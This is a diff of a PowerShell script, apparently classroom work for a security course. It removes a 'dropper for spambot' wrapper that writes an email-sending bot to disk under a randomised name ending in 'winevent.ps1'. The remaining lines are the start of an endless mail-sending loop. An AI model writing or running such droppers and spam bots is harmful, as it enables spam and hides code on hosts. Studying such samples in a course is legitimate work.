@@ -1,6 +1,3 @@
-# Dropper for spambot that will save the file and execute it. 
-
-$writeSBbot =@'
 # Send an email with powershell
 
 #Create Array
@@ -20,18 +17,3 @@ while ($true) {
     }
     
 }
-'@
-
-# Directory to write the bot.
-$sbDir = 'D:\Sec320\SYS-320\Week10\class\'
-
-# Create a random number to add to the file. 
-$sbRand = Get-random -Minimum 1000 -Maximum 1999
-
-# Create the file and location to save the bot. 
-
-$file = $sbDir + $sbRand + "winevent.ps1"
-
-# Write to a file.
-$writeSBbot | Out-File -FilePath $file
-
